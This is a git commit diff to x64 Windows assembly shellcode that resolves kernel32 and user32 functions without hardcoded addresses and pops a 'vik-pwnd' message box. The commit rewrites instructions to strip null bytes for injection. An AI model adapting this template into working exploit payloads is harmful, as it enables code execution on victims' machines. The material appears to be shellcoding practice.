4280a8eb79c8db4f0a23efc2b91343c7e83cda56
v1k1ngfr <32877266+v1k1ngfr@users.noreply.github.com>
2020-02-03 18:00:16 +0100

    Remove null bytes

--- x64_MessageBoxA.asm
+++ x64_MessageBoxA.asm
@@ -4,10 +4,11 @@ global main
 main:
 
 ; author : vikingfr
-; release : 202001.a
-; about : it pops a msgBox
-; thx to NytroRST for the awesome blogpost at https://nytrosecurity.com/2019/06/30/writing-shellcodes-for-windows-x64/
-
+; release : 202002.a
+; about : it pops a msgBox (1536 bytes) - no hardcoded address - x64
+; thx NytroRST for the awesome blogpost about at https://nytrosecurity.com/2019/06/30/writing-shellcodes-for-windows-x64/
+; thx Marcos Valle for the null byte avoid trick (shr) https://marcosvalle.github.io/re/exploit/2019/01/19/messagebox-shellcode.html
+; thx to Paranoidninja for the great post https://0xdarkvortex.dev/index.php/2019/04/01/windows-shellcoding-x86-calling-functions-in-kernel32-dll-part-2/
 ;-----------------------------------------------
 ; Find kernel32.dll base address 
 ;-----------------------------------------------
@@ -26,18 +27,21 @@ mov rbx, [rax + 0x20]    ; RBX = Base address
 ;-----------------------------------------------
 ; Parse kernel32 PE
 xor r8, r8                 ; Clear r8
-mov r8d, [rbx + 0x3c]      ; R8D = DOS->e_lfanew offset
-mov rdx, r8                ; RDX = DOS->e_lfanew
-add rdx, rbx               ; RDX = PE Header
-mov r8d, [rdx + 0x88]      ; R8D = Offset export table
-add r8, rbx                ; R8 = Export table
+mov r8d, [rbx + 0x3c]      ; R8D = DOS->e_lfanew offset #Data at 0x3c is E8 which is moved to r8d register: r8d = E8
+mov rdx, r8                ; RDX = DOS->e_lfanew        
+add rdx, rbx               ; RDX = PE Header            #add E8 to the base address of the kernel32.dll to get the RVA till the PE section: rdx = 76EC00E8
+;mov r8d, [rdx + 0x88]      ; R8D = Offset export table  #add 0x88(170 - E8) to 76EC00E8 to get RVA of Image Export Directory: r8d = 00000000000A003C
+add rdx,0x44				; avoid null bytes
+add rdx,0x44				; avoid null bytes
+mov r8d,[rdx]				; avoid null bytes
+add r8, rbx                ; R8 = Export table          #add A003C to the base address of the kernel32.dll(76EC0000) to get the base address of Image Export Directory: r8 = 76F6003C
 xor rsi, rsi               ; Clear RSI
 mov esi, [r8 + 0x20]       ; RSI = Offset namestable
 add rsi, rbx               ; RSI = Names table
 xor rcx, rcx               ; RCX = 0
-mov r9, 0x41636f7250746547 ; GetProcA
 
 ; Loop through exported functions and find GetProcAddress
+mov r9, 0x41636f7250746547 ; GetProcA
 Get_Function:
 inc rcx                    ; Increment the ordinal
 xor rax, rax               ; RAX = 0
@@ -78,7 +82,8 @@ mov rsi, rax                 ; LoadLibrary saved in RSI
 ; Load user32.dll using LoadLibraryA
 ;-----------------------------------------------
 ; call LoadLibraryA("user32.dll")
-mov rcx, 0x6c6c               ; ll
+mov ecx,0x6c6c4141               ; llaa
+shr rcx,16                    ; ll
 push rcx                      ; Push on the stack
 mov rcx, 0x642e323372657375   ; user32.d
 push rcx                      ; Push on stack
@@ -95,7 +100,8 @@ mov r15, rax                  ; Base address of user32.dll in R15
 ; Call GetProcAddress(user32.dll, "MessageBoxA")
 xor rcx, rcx                  ; RCX = 0
 push rcx                      ; Push 0 on stack
-mov rcx, 0x41786f               ;  oxA
+mov ecx, 0x41786f41               ;  oxA 
+shr rcx,8
 push rcx                      ; Push on the stack
 mov rcx,  0x426567617373654d   ;  MessageB
 push rcx                      ; Push on stack
@@ -118,7 +124,7 @@ mov r15, rax                  ; MessageBoxA in R15
 ; );
 ; Call convention using pointers : MessageBoxA(RCX, RDX, R8, R9) 
 sub rsp,0x28 ; shadow space, aligns stack
-mov rcx,0
+xor rcx,rcx ;
 xor rax, rax
 push rax
 mov  rax, 0x646e77702d6b6976 ; lpCaption
@@ -129,7 +135,7 @@ push rax
 mov  rax, 0x646e77702d6b6976 ; lpText
 push rax
 mov r8, rsp
-mov r9d,0
+xor r9,r9 ;
 call r15      ; Call MessageBoxA(0x00,"vik-pwnd","vik-pwnd",0x00)
 
 ;-----------------------------------------------
@@ -137,7 +143,8 @@ call r15      ; Call MessageBoxA(0x00,"vik-pwnd","vik-pwnd",0x00)
 ;-----------------------------------------------
 ; Call GetProcAddress(kernel32.dll, "ExitProcess")
 xor rcx, rcx                 ; RCX = 0
-mov rcx, 0x737365            ; ess
+mov rcx, 0x73736541            ; essa
+shr rcx,8                    ;ess
 push rcx                     ; Push on the stack
 mov rcx, 0x636f725074697845  ; ExitProc
 push rcx                     ; Push on stack
@@ -153,5 +160,5 @@ mov r15, rax                 ; ExitProcess in R15
 ; Call ExitProcess
 ;-----------------------------------------------
 ; Call ExitProcess(0)
-mov rcx, 0     ; Exit code 0
+xor rcx, rcx     ; Exit code 0
 call r15       ; ExitProcess(0)
